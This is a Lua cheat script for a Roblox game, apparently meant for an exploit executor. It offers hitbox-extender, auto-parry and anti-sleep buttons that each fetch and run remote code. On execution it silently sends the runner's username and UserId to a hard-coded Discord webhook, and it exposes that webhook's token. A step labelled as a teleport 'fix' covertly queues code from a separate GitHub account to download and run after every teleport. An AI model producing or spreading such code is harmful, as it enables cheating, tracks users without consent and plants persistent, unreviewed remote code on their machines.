local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- Whitelist table
local list = {
    7453817167, -- Zxrecrown2
    4076780530, -- ValZxyr
}

local isWhitelisted = table.find(list, LocalPlayer.UserId) ~= nil

-- Webhook sending
local webhookUrl = "https://discord.com/api/webhooks/1365686244444733531/gyVCHBrkWBivxX9Tfbt4H2KfEYgnyod-lR4cZ07PyyFJ3QNl0WnMqx83jWwZl1DKxdvY"
local function sendWebhook(content)
    pcall(function()
        local data = {content = content}
        local headers = {["Content-Type"] = "application/json"}
        if syn and syn.request then
            syn.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = headers,
                Body = HttpService:JSONEncode(data)
            })
        else
            HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
        end
    end)
end

-- Send webhook
sendWebhook("Script executed by: " .. LocalPlayer.Name .. " (UserId: " .. LocalPlayer.UserId .. ")")

-- Load UI
local VLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/Vape.txt"))()
local win = VLib:Window("BGSI", "Script", Color3.fromRGB(0,0,255), Enum.KeyCode.RightControl)

local Main = win:Tab("Main")

Main:Button("Hitbox Extender", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/HitboxExtender.lua"))()
end)

if isWhitelisted then
    Main:Button("Auto Parry", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/AutoParry.lua"))()
    end)
    Main:Button("Auto Perfect Block", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/AutoPerfectBlock.lua"))()
    end)
else
    Main:Label("Get whitelisted for full features!")
end

local Other = win:Tab("Other")
Other:Button("Anti Sleep", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/AntiSleep.lua"))()
end)

-- Fix Teleport Hook (REALLY important)
local QueueOnTeleport = syn and syn.queue_on_teleport or queue_on_teleport
QueueOnTeleport([[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BGSISCRIPT722/EndlessCleaned/main/EndlessCleaned.lua"))()
]])
